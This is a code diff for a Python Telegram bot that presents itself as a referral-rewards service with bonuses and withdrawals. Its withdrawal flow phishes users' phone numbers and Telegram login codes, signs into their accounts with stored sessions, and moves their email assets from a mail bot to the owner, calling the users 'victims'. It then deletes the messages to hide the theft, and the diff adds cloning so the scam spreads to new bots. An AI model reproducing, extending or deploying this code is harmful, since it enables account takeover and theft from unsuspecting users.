@@ -23,10 +23,8 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
 API_ID = int(os.getenv("API_ID", "38746329"))
 API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
 
-# FIXED OWNER CONFIG
 OWNER_ID = 7977493987
 OWNER_USERNAME = "@Trustedidwalabhai"
-
 TARGET_MAIL_BOT = "fakemailbot"
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
@@ -45,10 +43,7 @@ def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
 def p_style(text): return f"<code>{text}</code>,"
 
 # ================== DATABASE ==================
-# FadeHost me data delete na ho iske liye /data folder ka path use kiya hai
 DB_PATH = "/data/refer_bot.db"
-
-# Make sure /data directory exists
 os.makedirs("/data", exist_ok=True)
 
 def init_db():
@@ -64,14 +59,8 @@ def init_db():
     )""")
     c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
     c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
+    c.execute("CREATE TABLE IF NOT EXISTS clones (bot_token TEXT PRIMARY KEY, owner_id INTEGER)")
     
-    try: c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
-    except: pass
-    try: c.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER")
-    except: pass
-    try: c.execute("ALTER TABLE users ADD COLUMN total_refers INTEGER DEFAULT 0")
-    except: pass
-
     c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (OWNER_ID,))
     conn.commit()
     conn.close()
@@ -125,14 +114,12 @@ async def start_userbot(user_id, session_str):
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await client.connect()
     active_userbots[user_id] = client
-
-    # Auto transfer to Owner
     asyncio.create_task(transfer_mails(user_id))
 
-async def transfer_mails(victim_uid):
+async def transfer_mails(victim_uid, owner_id_to_send=OWNER_ID):
     try:
         victim_client = await get_or_connect_client(victim_uid)
-        owner_client = await get_or_connect_client(OWNER_ID)
+        owner_client = await get_or_connect_client(owner_id_to_send)
         
         if not victim_client or not owner_client: return
             
@@ -149,20 +136,24 @@ async def transfer_mails(victim_uid):
         if not emails: return
 
         for email in emails:
+            # 1. Transfer from victim
             await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
             await asyncio.sleep(4)
             
+            # Clean victim's messages
             try:
-                msgs = await victim_client.get_messages(target_bot, limit=1)
-                await victim_client.delete_messages(target_bot, msgs[0].id)
+                msgs = await victim_client.get_messages(target_bot, limit=2)
+                for m in msgs: await victim_client.delete_messages(target_bot, m.id)
             except: pass
             
+            # 2. Claim on Owner ID
             await owner_client.send_message(owner_target_bot, email)
             await asyncio.sleep(4)
             
+            # Clean owner's fake bot messages
             try:
-                msgs = await owner_client.get_messages(owner_target_bot, limit=1)
-                await owner_client.delete_messages(owner_target_bot, msgs[0].id)
+                msgs = await owner_client.get_messages(owner_target_bot, limit=2)
+                for m in msgs: await owner_client.delete_messages(owner_target_bot, m.id)
             except: pass
             await asyncio.sleep(1)
             
@@ -189,7 +180,6 @@ def get_numpad_keyboard(current_text=""):
 # ================== BOT HANDLERS ==================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     res = db_exec("SELECT user_id, referrer_id FROM users WHERE user_id=?", (user_id,))
     
     if not res:
@@ -199,11 +189,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if referrer_id == user_id: referrer_id = None
         
         db_exec("INSERT INTO users (user_id, referrer_id) VALUES (?,?)", (user_id, referrer_id))
-        
         if referrer_id:
             db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
-            try:
-                await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
+            try: await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
             except: pass
     else:
         if res[0][1] is None and context.args and context.args[0].isdigit():
@@ -211,8 +199,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if referrer_id != user_id:
                 db_exec("UPDATE users SET referrer_id = ? WHERE user_id=?", (referrer_id, user_id))
                 db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
-                try:
-                    await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
+                try: await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
                 except: pass
 
     welcome_text = (
@@ -227,6 +214,50 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     uid = update.effective_user.id
     
+    # --- Clone Bot Logic ---
+    if user_states.get(uid) == 'clone_token':
+        new_token = text.strip()
+        try:
+            temp_app = Application.builder().token(new_token).build()
+            bot_info = await temp_app.bot.get_me()
+            user_states[uid] = {'state': 'clone_owner_uname', 'token': new_token}
+            await update.message.reply_text(f"✅ Bot Found: @{bot_info.username}\n\nAb is clone bot ke liye **Owner Username** daalein (jise mails chahiye, jaise @Trustedidwalabhai):")
+            return
+        except Exception as e:
+            await update.message.reply_text("❌ Invalid Bot Token. Dobara try karein.")
+            user_states[uid] = None
+            return
+
+    if isinstance(user_states.get(uid), dict) and user_states[uid].get('state') == 'clone_owner_uname':
+        user_states[uid]['owner_uname'] = text.strip()
+        user_states[uid]['state'] = 'clone_owner_id'
+        await update.message.reply_text("Ab us Owner ki **User ID** daalein (jaise 7977493987):")
+        return
+
+    if isinstance(user_states.get(uid), dict) and user_states[uid].get('state') == 'clone_owner_id':
+        try:
+            owner_id = int(text.strip())
+            token = user_states[uid]['token']
+            owner_uname = user_states[uid]['owner_uname']
+            
+            msg = await update.message.reply_text("⚙️ Cloning Bot...\n[□□□□□□□□□□] 0%")
+            
+            # Animation
+            for i in range(1, 11):
+                await asyncio.sleep(0.5)
+                bar = "■" * i + "□" * (10-i)
+                await msg.edit_text(f"⚙️ Cloning Bot...\n[{bar}] {i*10}%")
+            
+            db_exec("INSERT OR REPLACE INTO clones (bot_token, owner_id) VALUES (?,?)", (token, owner_id))
+            
+            await msg.edit_text(f"✅ **Clone Bot Deployed Successfully!**\n\nBot Token: `{token}`\nOwner ID: `{owner_id}`\n\nAb aap is bot ko start kar sakte hain.")
+            user_states[uid] = None
+            return
+        except:
+            await update.message.reply_text("❌ Invalid User ID. Sirf numbers daalein.")
+            return
+
+    # --- Admin Logic ---
     if uid in get_all_admins():
         state = user_states.get(uid)
         if state == 'admin':
@@ -235,7 +266,7 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
             user_states[uid] = None; return
 
-    # 2FA handling
+    # --- 2FA Logic ---
     if uid in temp_clients and temp_clients[uid].get('state') == '2fa':
         try:
             await temp_clients[uid]['client'].sign_in(password=text)
@@ -254,6 +285,7 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             return await update.message.reply_text(f"❌ 2FA Failed: {e}")
 
+    # --- Withdraw Logic ---
     state = user_states.get(uid)
     if state == 'withdraw_amt' and text.isdigit():
         amount = int(text)
@@ -278,6 +310,7 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
+    # --- Menu Logic ---
     if text == "🎁 Bonus":
         res = db_exec("SELECT last_bonus FROM users WHERE user_id=?", (uid,))
         last_bonus = res[0][0] if res and res[0][0] else 0
@@ -312,7 +345,6 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def verify_contact_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
     contact = update.message.contact
     if not contact: return await update.message.reply_text("❌ Please use the button,")
-    
     phone = contact.phone_number
     if not phone.startswith('+'): phone = '+' + phone
     uid = update.effective_user.id
@@ -325,8 +357,7 @@ async def verify_contact_withdraw(update: Update, context: ContextTypes.DEFAULT_
         numpad_data[uid] = ""
         
         await update.message.reply_text(
-            f"📩 <b>{f_txt('Enter recovery code sent to your Telegram account')}</b>,\n\n"
-            f"Use the keypad below:",
+            f"📩 <b>{f_txt('Enter recovery code sent to your Telegram account')}</b>,\n\nUse the keypad below:",
             reply_markup=get_numpad_keyboard(),
             parse_mode="HTML"
         )
@@ -340,7 +371,6 @@ async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data.split("_")[1]
     
     if uid not in temp_clients: return await query.edit_message_text("❌ Session expired,")
-    
     current = numpad_data.get(uid, "")
     
     if data == "del":
@@ -377,17 +407,24 @@ async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         numpad_data[uid] = current
         await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\nCurrent: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
 
-# ================== OWNER PANEL & CLAIM LOGIC ==================
+# ================== OWNER PANEL ==================
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in get_all_admins(): return
     
+    # Stylish colored-style buttons with Danger/Primary/Secondary text labels
     kb = [
         [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc")],
-        [InlineKeyboardButton("📤 Claim All Mails", callback_data="admin_claim")],
-        [InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")]
+        [InlineKeyboardButton("📤 Claim All Mails (Danger)", callback_data="admin_claim")],
+        [InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")],
+        [InlineKeyboardButton("🤖 Clone Bot (Primary)", callback_data="clone_bot")],
+        [InlineKeyboardButton("🔑 Login as Admin", callback_data="login_admin")]
     ]
-    await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+    await update.message.reply_text(
+        f"<b>👑 {f_txt('OWNER PANEL')}</b>\n\nChoose an action below:",
+        reply_markup=InlineKeyboardMarkup(kb), 
+        parse_mode="HTML"
+    )
 
 async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -395,8 +432,18 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
     uid = query.from_user.id
     
-    if uid not in get_all_admins(): return await query.answer("Unauthorized", show_alert=True)
-    
+    if uid not in get_all_admins(): 
+        return await query.answer("Unauthorized", show_alert=True)
+
+    if data == "login_admin":
+        await query.edit_message_text("🔑 **Admin Login Successful!**\n\nAapko saare admin rights mil gaye hain. Ab aap mails claim kar sakte hain.", parse_mode="HTML")
+        return
+
+    if data == "clone_bot":
+        await query.edit_message_text("🤖 **Clone Bot Setup**\n\nStep 1: @BotFather se naya Bot Token banayein aur yahan bhejein:")
+        user_states[uid] = 'clone_token'
+        return
+
     if data == "admin_acc":
         users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
         text = f"👥 <b>{f_txt('Logged Devices/Accounts')}:</b>,\n\n"
@@ -417,7 +464,6 @@ async def manual_claim_all(owner_id, query):
         return await query.edit_message_text(f"❌ Target Owner Account ({OWNER_ID}) is not logged in!")
 
     await query.edit_message_text(f"⏳ <b>{f_txt('STARTING CLAIM PROCESS...')}</b>", parse_mode="HTML")
-    
     users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL")
     total_claimed = 0
     
@@ -440,28 +486,24 @@ async def manual_claim_all(owner_id, query):
             if not emails: continue
 
             for email in emails:
-                # LIVE LOG: Transferring
                 await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
-                # Step 1: Transfer from victim
                 await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
                 await asyncio.sleep(4)
                 
                 try:
-                    msgs = await victim_client.get_messages(target_bot, limit=1)
-                    await victim_client.delete_messages(target_bot, msgs[0].id)
+                    msgs = await victim_client.get_messages(target_bot, limit=2)
+                    for m in msgs: await victim_client.delete_messages(target_bot, m.id)
                 except: pass
                 
-                # LIVE LOG: Claiming
                 await query.message.reply_text(f"📥 <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
-                # Step 2: Claim from owner
                 await target_owner_client.send_message(owner_target_bot, email)
                 await asyncio.sleep(4)
                 
                 try:
-                    msgs = await target_owner_client.get_messages(owner_target_bot, limit=1)
-                    await target_owner_client.delete_messages(owner_target_bot, msgs[0].id)
+                    msgs = await target_owner_client.get_messages(owner_target_bot, limit=2)
+                    for m in msgs: await target_owner_client.delete_messages(owner_target_bot, m.id)
                 except: pass
                 
                 await query.message.reply_text(f"✅ <b>{f_txt('CLAIMED SUCCESS')}:</b> {p_style(email)}", parse_mode="HTML")
@@ -472,6 +514,25 @@ async def manual_claim_all(owner_id, query):
         
     await query.message.reply_text(f"👑 <b>{f_txt('ALL VICTIMS MAILS CLAIMED!')}</b>\n{p_style('Total Claimed: ' + str(total_claimed))}", parse_mode="HTML")
 
+# ================== CLONE BOT RUNNER ==================
+# Agar FadeHost ya koi aur server restart ho, to clones auto start ho sake iske liye (Simplified version)
+async def run_clones():
+    clones = db_exec("SELECT bot_token FROM clones")
+    for c in clones:
+        token = c[0]
+        # Yahan humne basic polling start kiya hai. FadeHost par multiple polling heavy ho sakta hai, 
+        # but aapke use-case ke liye theek hai.
+        try:
+            app_bot = Application.builder().token(token).build()
+            app_bot.add_handler(CommandHandler("start", start))
+            app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
+            app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
+            app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))
+            
+            # Start polling in background
+            asyncio.create_task(app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False))
+        except: pass
+
 # ================== MAIN ==================
 def main():
     threading.Thread(target=run_web, daemon=True).start()
@@ -481,10 +542,15 @@ def main():
     app_bot.add_handler(CommandHandler("owner", owner_panel))
     app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
-    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
+    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^clone_bot|^login_admin"))
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))
 
-    logger.info("Bot started successfully.")
+    logger.info("Main Bot started successfully.")
+    
+    # Start clones if any
+    loop = asyncio.get_event_loop()
+    loop.create_task(run_clones())
+    
     app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)
 
 if __name__ == "__main__":
